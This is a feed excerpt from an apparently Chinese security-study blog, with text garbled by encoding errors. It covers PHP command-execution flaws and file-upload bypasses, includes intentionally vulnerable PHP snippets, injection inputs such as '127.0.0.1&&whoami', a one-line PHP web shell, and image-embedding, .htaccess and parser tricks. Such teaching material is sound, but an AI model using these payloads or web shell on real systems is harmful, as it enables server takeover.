    <content type="html"><![CDATA[<h3 id="1-åŸç†"><a href="#1-åŸç†" class="headerlink" title="1.åŸç†"></a>1.åŸç†<a id="more"></a></h3><p>å‘½ä»¤æ‰§è¡Œæ¼æ´æ˜¯æŒ‡åº”ç”¨æœ‰æ—¶éœ€è¦è°ƒç”¨ä¸€äº›æ‰§è¡Œç³»ç»Ÿå‘½ä»¤çš„å‡½æ•°ï¼Œå¦‚ï¼š<code>system()ã€exec()ã€shell_exec()ã€eval()ã€passthru()</code>ï¼Œä»£ç æœªå¯¹ç”¨æˆ·å¯æ§å‚æ•°åšè¿‡æ»¤ï¼Œå½“ç”¨æˆ·èƒ½æ§åˆ¶è¿™äº›å‡½æ•°ä¸­çš„å‚æ•°æ—¶ï¼Œå°±å¯ä»¥å°†æ¶æ„ç³»ç»Ÿå‘½ä»¤æ‹¼æ¥åˆ°æ­£å¸¸å‘½ä»¤ä¸­ï¼Œä»è€Œé€ æˆå‘½ä»¤æ‰§è¡Œæ”»å‡»ã€‚</p><h3 id="å¸¸è§è¿æ¥ç¬¦"><a href="#å¸¸è§è¿æ¥ç¬¦" class="headerlink" title="*å¸¸è§è¿æ¥ç¬¦"></a>*å¸¸è§è¿æ¥ç¬¦</h3><table><thead><tr><th>A;B</th><th>å…ˆæ‰§è¡ŒAï¼Œå†æ‰§è¡ŒB</th></tr></thead><tbody><tr><td>A&amp;B</td><td>ABä¸¤ä¸ªæ— åˆ¶çº¦å…³ç³»ï¼Œéƒ½å¯ä»¥æ‰§è¡Œ</td></tr><tr><td>A|B</td><td>Aä¸æ‰§è¡Œï¼ŒBæ‰§è¡Œï¼Œåªæ˜¾ç¤ºBçš„æ‰§è¡Œç»“æœ</td></tr><tr><td>A&amp;&amp;B</td><td>Aæ‰§è¡ŒæˆåŠŸæ‰ä¼šæ‰§è¡ŒB</td></tr><tr><td>A||B</td><td>Aæ‰§è¡Œå¤±è´¥ï¼Œç„¶åæ‰ä¼šæ‰§è¡ŒB</td></tr></tbody></table><h3 id="2-åˆ†ç±»"><a href="#2-åˆ†ç±»" class="headerlink" title="2.åˆ†ç±»"></a>2.åˆ†ç±»</h3><h4 id="1â€˜-ä»£ç å±‚è¿‡æ»¤ä¸ä¸¥"><a href="#1â€˜-ä»£ç å±‚è¿‡æ»¤ä¸ä¸¥" class="headerlink" title="1â€˜.ä»£ç å±‚è¿‡æ»¤ä¸ä¸¥"></a>1â€˜.ä»£ç å±‚è¿‡æ»¤ä¸ä¸¥</h4><p>å•†ä¸šåº”ç”¨çš„ä¸€äº›æ ¸å¿ƒä»£ç å°è£…åœ¨äºŒè¿›åˆ¶æ–‡ä»¶ä¸­ï¼Œåœ¨WEBåº”ç”¨ä¸­é€šè¿‡systemå‡½æ•°æ¥è°ƒç”¨: <code>system(&quot;bin/program/--arg $arg&quot;);</code></p><h4 id="2â€™-ç³»ç»Ÿçš„æ¼æ´é€ æˆå‘½ä»¤æ³¨å…¥"><a href="#2â€™-ç³»ç»Ÿçš„æ¼æ´é€ æˆå‘½ä»¤æ³¨å…¥" class="headerlink" title="2â€™.ç³»ç»Ÿçš„æ¼æ´é€ æˆå‘½ä»¤æ³¨å…¥"></a>2â€™.ç³»ç»Ÿçš„æ¼æ´é€ æˆå‘½ä»¤æ³¨å…¥</h4><p>bashç ´å£³æ¼æ´(CVE-2013-6271)</p><h4 id="3â€™-è°ƒç”¨çš„ç¬¬ä¸‰æ–¹ç»„ä»¶å­˜åœ¨ä»£ç æ‰§è¡Œæ¼æ´"><a href="#3â€™-è°ƒç”¨çš„ç¬¬ä¸‰æ–¹ç»„ä»¶å­˜åœ¨ä»£ç æ‰§è¡Œæ¼æ´" class="headerlink" title="3â€™.è°ƒç”¨çš„ç¬¬ä¸‰æ–¹ç»„ä»¶å­˜åœ¨ä»£ç æ‰§è¡Œæ¼æ´"></a>3â€™.è°ƒç”¨çš„ç¬¬ä¸‰æ–¹ç»„ä»¶å­˜åœ¨ä»£ç æ‰§è¡Œæ¼æ´</h4><p>wordpressä¸­ç”¨æ¥å¤„ç†å›¾ç‰‡çš„ImageMagickç»„ä»¶</p><p>JAVAä¸­çš„å‘½ä»¤æ‰§è¡Œæ¼æ´ï¼ˆstruts2/ElasticsearchGroovyç­‰ï¼‰</p><p>ThinkPHPå‘½ä»¤æ‰§è¡Œæ¼æ´</p><h3 id="3-é˜²å¾¡"><a href="#3-é˜²å¾¡" class="headerlink" title="3.é˜²å¾¡"></a>3.é˜²å¾¡</h3><p>1.å°½é‡å°‘ç”¨æ‰§è¡Œå‘½ä»¤çš„å‡½æ•°æˆ–è€…ç›´æ¥ç¦ç”¨<br>2.å‚æ•°å€¼å°½é‡ä½¿ç”¨å¼•å·åŒ…æ‹¬ï¼Œåœ¨æ‹¼æ¥ä¹‹å‰è°ƒç”¨addslasheså‡½æ•°è¿›è¡Œè½¬ä¹‰<br>3.åœ¨ä½¿ç”¨åŠ¨æ€å‡½æ•°ä¹‹å‰ï¼Œç¡®ä¿ä½¿ç”¨çš„å‡½æ•°æ˜¯æŒ‡å®šçš„å‡½æ•°ä¹‹ä¸€<br>4.åœ¨è¿›å…¥æ‰§è¡Œå‘½ä»¤çš„å‡½æ•°æ–¹æ³•ä¹‹å‰ï¼Œå¯¹å‚æ•°è¿›è¡Œè¿‡æ»¤ï¼Œå¯¹æ•æ„Ÿå­—ç¬¦è¿›è¡Œè½¬ä¹‰<br>5.å¯¹äºå¯æ§ç‚¹æ˜¯ç¨‹åºå‚æ•°çš„æƒ…å†µä¸‹ï¼Œä½¿ç”¨escapeshellcmdå‡½æ•°è¿›è¡Œè¿‡æ»¤ï¼Œå¯¹äºå¯æ§ç‚¹æ˜¯ç¨‹åºå‚æ•°å€¼çš„æƒ…å†µä¸‹ï¼Œä½¿ç”¨escapeshellargå‡½æ•°è¿›è¡Œè¿‡æ»¤</p><h4 id="ä¸‹é¢æ˜¯æ¶‰åŠåˆ°çš„çŸ¥è¯†ç‚¹ï¼ˆä¸ªäººè®¤ä¸ºï¼‰"><a href="#ä¸‹é¢æ˜¯æ¶‰åŠåˆ°çš„çŸ¥è¯†ç‚¹ï¼ˆä¸ªäººè®¤ä¸ºï¼‰" class="headerlink" title="ä¸‹é¢æ˜¯æ¶‰åŠåˆ°çš„çŸ¥è¯†ç‚¹ï¼ˆä¸ªäººè®¤ä¸ºï¼‰"></a>ä¸‹é¢æ˜¯æ¶‰åŠåˆ°çš„çŸ¥è¯†ç‚¹ï¼ˆä¸ªäººè®¤ä¸ºï¼‰</h4><h3 id="1-åˆ©ç”¨ç³»ç»Ÿå‡½æ•°å®ç°è¿œç¨‹å‘½ä»¤æ‰§è¡Œ"><a href="#1-åˆ©ç”¨ç³»ç»Ÿå‡½æ•°å®ç°è¿œç¨‹å‘½ä»¤æ‰§è¡Œ" class="headerlink" title="1.åˆ©ç”¨ç³»ç»Ÿå‡½æ•°å®ç°è¿œç¨‹å‘½ä»¤æ‰§è¡Œ"></a>1.åˆ©ç”¨ç³»ç»Ÿå‡½æ•°å®ç°è¿œç¨‹å‘½ä»¤æ‰§è¡Œ</h3><p>åœ¨PHPä¸‹ï¼Œå…è®¸å‘½ä»¤æ‰§è¡Œçš„å‡½æ•°æœ‰ï¼š</p><p><code>eval()</code></p><p><code>assert()</code></p><p><code>preg_replace()</code></p><p><code>call_user_func()</code></p><p><code>ob_start()ã€unserialize()ã€creat_function()</code><br><code>usort()ã€uasort()ã€uksort()</code><br><code>array_filter()</code><br><code>array_reduce()</code><br><code>array_map()</code><br><code>...</code></p><h4 id="eval-å‡½æ•°"><a href="#eval-å‡½æ•°" class="headerlink" title="eval()å‡½æ•°"></a>eval()å‡½æ•°</h4><p>å®šä¹‰å’Œç”¨æ³•</p><p>eval()å‡½æ•°æŠŠå­—ç¬¦ä¸²æŒ‰ç…§PHPä»£ç æ¥è®¡ç®—ï¼Œè¯¥å­—ç¬¦ä¸²å¿…é¡»åˆæ³•ä¸”ä»¥åˆ†å·ç»“å°¾</p><p>è‹¥æœªåœ¨å­—ç¬¦ä¸²ä¸­è°ƒç”¨returnè¯­å¥ï¼Œè¿”å›NULL,å­˜åœ¨è§£æé”™è¯¯ï¼Œè¿”å›false</p><p>è¯­æ³•<br>eval(phpcode)ï¼Œphpcode å¿…éœ€ï¼Œè§„å®šè¦è®¡ç®—çš„ PHP ä»£ç ã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$a = $_GET[<span class="string">'a'</span>];</span><br><span class="line"><span class="keyword">eval</span>($a);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/oscommand/1.php?a=phpinfo();</span><br></pre></td></tr></table></figure><h4 id="assert-å‡½æ•°"><a href="#assert-å‡½æ•°" class="headerlink" title="assert()å‡½æ•°"></a>assert()å‡½æ•°</h4><p>å®šä¹‰å’Œç”¨æ³•<br>æ£€æŸ¥ä¸€ä¸ªæ–­è¨€æ˜¯å¦ä¸º FALSE</p><p>è¯­æ³•</p><p>PHP 5<br>bool assert ( mixed description ] )<br>PHP 7<br>bool assert ( mixed exception ] )<br>assert() ä¼šæ£€æŸ¥æŒ‡å®šçš„ assertion å¹¶åœ¨ç»“æœä¸º FALSE æ—¶é‡‡å–é€‚å½“çš„è¡ŒåŠ¨</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$a = $_GET[<span class="string">'a'</span>];</span><br><span class="line">assert($a);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/oscommand/1.php?a=phpinfo();</span><br><span class="line">http://127.0.0.1/oscommand/1.php?a=phpinfo()</span><br></pre></td></tr></table></figure><h4 id="preg-replace-å‡½æ•°"><a href="#preg-replace-å‡½æ•°" class="headerlink" title="preg_replace()å‡½æ•°"></a>preg_replace()å‡½æ•°</h4><p>å®šä¹‰<br>preg_replace å‡½æ•°æ‰§è¡Œä¸€ä¸ªæ­£åˆ™è¡¨è¾¾å¼çš„æœç´¢å’Œæ›¿æ¢ã€‚</p><p>è¯­æ³•<br>mixed preg_replace ( mixed replacement , mixed limit = -1 [, int &amp;$count ]] )<br>æœç´¢ subject ä¸­åŒ¹é… pattern çš„éƒ¨åˆ†ï¼Œ ä»¥ replacement è¿›è¡Œæ›¿æ¢ã€‚<br>å‚æ•°è¯´æ˜ï¼š</p><p>patternå¤„å­˜åœ¨ä¸€ä¸ªâ€/eâ€ä¿®é¥°ç¬¦æ—¶ï¼Œ$replacementçš„å€¼ä¼šè¢«å½“æˆphpä»£ç æ¥æ‰§è¡Œã€‚<br>$replacement: ç”¨äºæ›¿æ¢çš„å­—ç¬¦ä¸²æˆ–å­—ç¬¦ä¸²æ•°ç»„ã€‚<br>$subject: è¦æœç´¢æ›¿æ¢çš„ç›®æ ‡å­—ç¬¦ä¸²æˆ–å­—ç¬¦ä¸²æ•°ç»„ã€‚<br>$limit: å¯é€‰ï¼Œå¯¹äºæ¯ä¸ªæ¨¡å¼ç”¨äºæ¯ä¸ª subject å­—ç¬¦ä¸²çš„æœ€å¤§å¯æ›¿æ¢æ¬¡æ•°ã€‚ é»˜è®¤æ˜¯-1ï¼ˆæ— é™åˆ¶ï¼‰ã€‚<br>$count: å¯é€‰ï¼Œä¸ºæ›¿æ¢æ‰§è¡Œçš„æ¬¡æ•°ã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$a = $_GET[<span class="string">'a'</span>];</span><br><span class="line"><span class="keyword">echo</span> preg_replace(<span class="string">"/test/e"</span>, $a, <span class="string">"just test!"</span>)</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;oscommand&#x2F;1.php?a&#x3D;phpinfo()</span><br></pre></td></tr></table></figure><h4 id="call-user-func-å‡½æ•°"><a href="#call-user-func-å‡½æ•°" class="headerlink" title="call_user_func()å‡½æ•°"></a>call_user_func()å‡½æ•°</h4><p>å®šä¹‰å’Œç”¨æ³•<br>call_user_func â€” æŠŠç¬¬ä¸€ä¸ªå‚æ•°ä½œä¸ºå›è°ƒå‡½æ•°è°ƒç”¨</p><p>è¯­æ³•<br>mixed call_user_func ( callable parameter [, mixed $â€¦ ]] )<br>ç¬¬ä¸€ä¸ªå‚æ•° callback æ˜¯è¢«è°ƒç”¨çš„å›è°ƒå‡½æ•°ï¼Œå…¶ä½™å‚æ•°æ˜¯å›è°ƒå‡½æ•°çš„å‚æ•°ã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">call_user_func($_GET[<span class="string">'a'</span>],$_GET[<span class="string">'b'</span>]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;oscommand&#x2F;1.php?a&#x3D;assert&amp;b&#x3D;phpinfo()</span><br></pre></td></tr></table></figure><h3 id="2-ç³»ç»Ÿå‘½ä»¤æ‰§è¡Œæ¼æ´"><a href="#2-ç³»ç»Ÿå‘½ä»¤æ‰§è¡Œæ¼æ´" class="headerlink" title="2.ç³»ç»Ÿå‘½ä»¤æ‰§è¡Œæ¼æ´"></a>2.ç³»ç»Ÿå‘½ä»¤æ‰§è¡Œæ¼æ´</h3><p>ç³»ç»Ÿå‘½ä»¤æ‰§è¡Œçš„å‡½æ•°<br>system()<br>exec()<br>shell_exec()<br>passthru()<br>pcntl_exec()<br>popen()<br>proc_open()<br>åå¼•å·<br>â€¦</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">'submit'</span>]))&#123;</span><br><span class="line">    $target = $_REQUEST[<span class="string">'ip'</span>];</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>(php_uname(<span class="string">'s'</span>), <span class="string">'Windows NT'</span>)) &#123;</span><br><span class="line">        $cmd = shell_exec(<span class="string">'ping '</span> . $taeget);</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'&lt;pre&gt;'</span>.$cmd.<span class="string">'&lt;/pre&gt;'</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $cmd = shell_exec(<span class="string">'ping -c 3 '</span> . $target);</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">'&lt;pre&gt;'</span>.$cmd.<span class="string">'&lt;/pre&gt;'</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>é¡µé¢é€šè¿‡requestè·å–ä¼ å…¥çš„ipå‚æ•°ï¼Œå¹¶è·å–å½“å‰ç³»ç»Ÿç±»å‹ä¹‹åæ‹¼æ¥ç›¸åº”å‘½ä»¤â€ping + target IPâ€å¹¶æ‰§è¡Œï¼Œåœ¨æ­¤è¿‡ç¨‹ä¸­IPå‚æ•°å¯æ§ï¼Œæ‰€ä»¥åœ¨IPå¯æ‹¼æ¥å‘½ä»¤ã€‚</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1&amp;&amp;whoami</span><br><span class="line">127.0.0.1;whoami</span><br><span class="line">127.0.0.1||whoami</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;h3 id=&quot;1-åŸç†&quot;&gt;&lt;a href=&quot;#1-åŸç†&quot; class=&quot;headerlink&quot; title=&quot;1.åŸç†&quot;&gt;&lt;/a&gt;1.åŸç†
    
    </summary>
    
    
    
      <category term="é€»è¾‘æ¼æ´" scheme="http://yoursite.com/tags/%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E/"/>
    
  </entry>
  
  <entry>
    <title>æ–‡ä»¶ä¸Šä¼ </title>
    <link href="http://yoursite.com/2020/01/15/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/"/>
    <id>http://yoursite.com/2020/01/15/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/</id>
    <published>2020-01-15T02:28:05.000Z</published>
    <updated>2020-03-11T08:50:57.400Z</updated>
    
    <content type="html"><![CDATA[<h4 id="ä¸€å¥è¯æœ¨é©¬"><a href="#ä¸€å¥è¯æœ¨é©¬" class="headerlink" title="ä¸€å¥è¯æœ¨é©¬"></a>ä¸€å¥è¯æœ¨é©¬</h4><a id="more"></a><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php eval($_POST[fox])?&gt;</span><br></pre></td></tr></table></figure><h4 id="å›¾ç‰‡ä¸€å¥è¯æœ¨é©¬åˆ¶ä½œ"><a href="#å›¾ç‰‡ä¸€å¥è¯æœ¨é©¬åˆ¶ä½œ" class="headerlink" title="å›¾ç‰‡ä¸€å¥è¯æœ¨é©¬åˆ¶ä½œ"></a>å›¾ç‰‡ä¸€å¥è¯æœ¨é©¬åˆ¶ä½œ</h4><p>cmdåˆ¶ä½œ,è¿›å…¥å›¾ç‰‡æ‰€åœ¨ç›®å½•ï¼Œcopy xx.jpg/b+xx.php/a newxx.jpg<br>winhexåˆ¶ä½œ åœ¨æ–‡æœ¬æœ€åæ·»åŠ ä¸€å¥è¯æœ¨é©¬ï¼Œç¼–ç å¦å­˜ä¸ºæ–°å›¾ç‰‡</p><h4 id="å…³äºæ–‡ä»¶æ ¼å¼è§£æï¼š"><a href="#å…³äºæ–‡ä»¶æ ¼å¼è§£æï¼š" class="headerlink" title="å…³äºæ–‡ä»¶æ ¼å¼è§£æï¼š"></a>å…³äºæ–‡ä»¶æ ¼å¼è§£æï¼š</h4><p>æ¯ç§ç±»å‹çš„æ–‡ä»¶æ— æ³•è¯†åˆ«åˆ«çš„æ–‡ä»¶æ ¼å¼</p><h4 id="jséªŒè¯æœ¬åœ°ä¸Šä¼ "><a href="#jséªŒè¯æœ¬åœ°ä¸Šä¼ " class="headerlink" title="jséªŒè¯æœ¬åœ°ä¸Šä¼ "></a>jséªŒè¯æœ¬åœ°ä¸Šä¼ </h4><p>1.jsåˆ¤æ–­ä»£ç ä¸º:onsubmit = â€œreturn checkFile()â€<br>2.å¢åŠ å…è®¸ä¸Šä¼ çš„æ–‡ä»¶ç±»å‹.php<br>3.æ‹·è´æºä»£ç ï¼Œåˆ é™¤åˆ¤æ–­ä»£ç ï¼Œåœ¨actionå¤„æŒ‡å®šä¸Šä¼ è·¯å¾„<br>4.ä¸Šä¼ å…è®¸ä¸Šä¼ çš„ä»£ç ï¼ŒæŠ“åŒ…æ”¹åŒ…</p><h4 id="MIMEç»•è¿‡"><a href="#MIMEç»•è¿‡" class="headerlink" title="MIMEç»•è¿‡:"></a>MIMEç»•è¿‡:</h4><p>ä¿®æ”¹content-typeå­—æ®µå¯ä»¥ä¸Šä¼ æŒ‡å®šçš„æ–‡ä»¶æ ¼å¼<br>æ–‡ä»¶æ‹“å±•é™åˆ¶:<br>å¤§å°å†™ç»•è¿‡æ–‡ä»¶ä¸Šä¼ ï¼ˆwidnowsä¸‹æ–‡ä»¶ä¸åŒºåˆ†å¤§å°å†™ linuxåŒºåˆ†ï¼‰<br>.ç©ºæ ¼ç»•è¿‡.php.,.phpç©ºæ ¼éƒ½è§£æä¸º.php</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">.htaccessæ–‡ä»¶ä»£ç :</span><br><span class="line">&lt;Filesmatch&quot;fox&quot;&gt;</span><br><span class="line">SetHandler application&#x2F;x-httpd-php</span><br><span class="line">&lt;&#x2F;FilesMatch&gt;</span><br><span class="line">æŠŠæ–‡ä»¶åä¸ºfoxçš„æ–‡ä»¶å…¨éƒ½ä»¥phpè¿è¡Œ(å…ˆä¸Šä¼ .htaccessæ–‡ä»¶å†ä¸Šä¼ æ–‡ä»¶)</span><br></pre></td></tr></table></figure><h4 id="DATAç»•è¿‡"><a href="#DATAç»•è¿‡" class="headerlink" title="::$DATAç»•è¿‡"></a>::$DATAç»•è¿‡</h4><h4 id="Apacheè§£ææ¼æ´-è¯»å–æ–‡ä»¶æ—¶ä»å³å¾€å·¦å¼€å§‹åˆ¤æ–­è§£æï¼Œè‹¥é‡åˆ°ä¸å¯è§£æçš„æ–‡ä»¶ååˆ™è·³è¿‡ã€‚1-php-xxx-1-php"><a href="#Apacheè§£ææ¼æ´-è¯»å–æ–‡ä»¶æ—¶ä»å³å¾€å·¦å¼€å§‹åˆ¤æ–­è§£æï¼Œè‹¥é‡åˆ°ä¸å¯è§£æçš„æ–‡ä»¶ååˆ™è·³è¿‡ã€‚1-php-xxx-1-php" class="headerlink" title="Apacheè§£ææ¼æ´,è¯»å–æ–‡ä»¶æ—¶ä»å³å¾€å·¦å¼€å§‹åˆ¤æ–­è§£æï¼Œè‹¥é‡åˆ°ä¸å¯è§£æçš„æ–‡ä»¶ååˆ™è·³è¿‡ã€‚1.php.xxx=1.php"></a>Apacheè§£ææ¼æ´,è¯»å–æ–‡ä»¶æ—¶ä»å³å¾€å·¦å¼€å§‹åˆ¤æ–­è§£æï¼Œè‹¥é‡åˆ°ä¸å¯è§£æçš„æ–‡ä»¶ååˆ™è·³è¿‡ã€‚1.php.xxx=1.php</h4><h4 id="å†…å®¹éªŒè¯æ–‡ä»¶ä¸Šä¼ "><a href="#å†…å®¹éªŒè¯æ–‡ä»¶ä¸Šä¼ " class="headerlink" title="å†…å®¹éªŒè¯æ–‡ä»¶ä¸Šä¼ :"></a>å†…å®¹éªŒè¯æ–‡ä»¶ä¸Šä¼ :</h4><p>æ–‡ä»¶å¤´ä¸Šä¼ ç»•è¿‡ï¼Œåœ¨ä¸€å¥è¯æœ¨é©¬phpæ–‡ä»¶å‰é¢åŠ ä¸Šjpgï¼Œpngï¼Œgifå›¾ç‰‡æ–‡ä»¶çš„å¼€å¤´å¯ä»¥ç»•è¿‡æ£€æµ‹</p><h4 id="00æˆªæ–­"><a href="#00æˆªæ–­" class="headerlink" title="%00æˆªæ–­:"></a>%00æˆªæ–­:</h4><p>0x00æ˜¯åå…­è¿›åˆ¶è¡¨ç¤ºæ–¹æ³•ï¼Œæ˜¯asciiç ä¸º0çš„å­—ç¬¦ï¼Œåœ¨æœ‰äº›å‡½æ•°å¤„ç†æ—¶ï¼Œä¼šæŠŠè¿™ä¸ªå­—ç¬¦å½“ä½œç»“æŸç¬¦ï¼Œå¯ç”¨äºå¯¹æ–‡ä»¶ç±»å‹åçš„ç»•è¿‡<br>getå¯ä»¥è‡ªåŠ¨è½¬æ¢ï¼Œpostéœ€è¦ç‰¹æ®Šè½¬æ¢ï¼ˆé€‰ä¸­è¿›è¡Œurlæ ¼å¼è½¬æ¢ï¼‰</p><h4 id="iis6-0è§£ææ¼æ´"><a href="#iis6-0è§£ææ¼æ´" class="headerlink" title="iis6.0è§£ææ¼æ´"></a>iis6.0è§£ææ¼æ´</h4><p>1.ç›®å½•è§£æ<br>ä»¥<em>.aspå‘½åçš„æ–‡ä»¶å¤¹é‡Œçš„æ–‡ä»¶éƒ½ä¼šè¢«å½“æˆaspæ–‡ä»¶æ‰§è¡Œ<br>æ¯”å¦‚1.asp/1.jpgï¼Œ1.jpgä¼šè¢«å½“åšaspæ–‡ä»¶æ‰§è¡Œ<br>2.æ–‡ä»¶è§£æ<br>*.asp;.jpgåœ¨;åé¢çš„è¢«ç›´æ¥å¿½ç•¥ï¼Œå½“æˆ</em>.aspæ–‡ä»¶æ‰§è¡Œ</p><h4 id="ç¼–è¾‘å™¨æ¼æ´"><a href="#ç¼–è¾‘å™¨æ¼æ´" class="headerlink" title="ç¼–è¾‘å™¨æ¼æ´:"></a>ç¼–è¾‘å™¨æ¼æ´:</h4><p>1.ä¸éœ€è¦åå°éªŒè¯ç›´æ¥å¯ä»¥è¿›è¡Œæ“ä½œ(å¾¡å‰‘æ‰«æè¿›è¡Œç›®æ ‡çˆ†ç ´)<br>2.éœ€è¦åå°ç®¡ç†ç™»å½•æ‰èƒ½å¤Ÿæ“ä½œ<br>å¸¸ç”¨çš„ç¼–è¾‘å™¨:FCKeditor,EWEbeditor,CKFinder,UEDITOR<br>FCKeditor:çªç ´å»ºç«‹æ–‡ä»¶å¤¹,å®è´¨æ˜¯åˆ©ç”¨iis6çš„ç›®å½•è§£æ<br>EWEbeditoréå†æ¼æ´<br>ewebeditor/admin_uploadfile.asp?id=14&amp;dir=../</p><h4 id="iis7-0ä»¥ä¸Šé«˜ç‰ˆæœ¬æ¼æ´"><a href="#iis7-0ä»¥ä¸Šé«˜ç‰ˆæœ¬æ¼æ´" class="headerlink" title="iis7.0ä»¥ä¸Šé«˜ç‰ˆæœ¬æ¼æ´"></a>iis7.0ä»¥ä¸Šé«˜ç‰ˆæœ¬æ¼æ´</h4><p>1.jpg/.phpï¼Œåœ¨1.jpgä¸­å†™å…¥ä¸€å¥è¯æœ¨é©¬ï¼Œå› ä¸º.phpä¸å­˜åœ¨ä½†æ˜¯ä¼šç”¨phpæ¥è§£æï¼Œå°±ä¼šè¯»å–1.jpgï¼Œè¿™å…¶ä¸­çš„ä¸€å¥è¯å°±ä¼šè¢«æ‰§è¡Œ</p><h3 id="å¸¸è§æ–‡ä»¶å¤´"><a href="#å¸¸è§æ–‡ä»¶å¤´" class="headerlink" title="å¸¸è§æ–‡ä»¶å¤´"></a>å¸¸è§æ–‡ä»¶å¤´</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">JPEG (jpg)ï¼Œ             ã€€æ–‡ä»¶å¤´ï¼šFFD8FFã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€</span><br><span class="line">PNG (png)ï¼Œ            ã€€ã€€ æ–‡ä»¶å¤´ï¼š89504E47 æ–‡ä»¶å°¾ï¼š0000000049454E44AE426082</span><br><span class="line">GIF (gif)ï¼Œ              ã€€ã€€æ–‡ä»¶å¤´ï¼š47494638</span><br><span class="line">ZIP Archive (zip)ï¼Œ           æ–‡ä»¶å¤´ï¼š504B0304 æ–‡ä»¶å°¾ï¼š00000000</span><br><span class="line">TIFF (tif)ï¼Œ              ã€€  æ–‡ä»¶å¤´ï¼š49492A00</span><br><span class="line">Windows Bitmap (bmp)ï¼Œ      æ–‡ä»¶å¤´ï¼š424D</span><br><span class="line">CAD (dwg)ï¼Œ               æ–‡ä»¶å¤´ï¼š41433130</span><br><span class="line">Adobe Photoshop (psd)ï¼Œ      æ–‡ä»¶å¤´ï¼š38425053</span><br><span class="line">Rich Text Format (rtf)ï¼Œ       æ–‡ä»¶å¤´ï¼š7B5C727466</span><br><span class="line">XML (xml)ï¼Œ                æ–‡ä»¶å¤´ï¼š3C3F786D6C</span><br><span class="line">HTML (html)ï¼Œ              æ–‡ä»¶å¤´ï¼š68746D6C3E</span><br><span class="line">Email [thorough only] (eml)ï¼Œ   æ–‡ä»¶å¤´ï¼š44656C69766572792D646174653A</span><br><span class="line">Outlook Express (dbx)ï¼Œ       æ–‡ä»¶å¤´ï¼šCFAD12FEC5FD746F</span><br><span class="line">Outlook (pst)ï¼Œ             æ–‡ä»¶å¤´ï¼š2142444E</span><br><span class="line">MS Word&#x2F;Excel (xls.or.doc)ï¼Œ    æ–‡ä»¶å¤´ï¼šD0CF11E0</span><br><span class="line">MS Access (mdb)ï¼Œ           æ–‡ä»¶å¤´ï¼š5374616E64617264204A</span><br><span class="line">WordPerfect (wpd)ï¼Œ          æ–‡ä»¶å¤´ï¼šFF575043</span><br><span 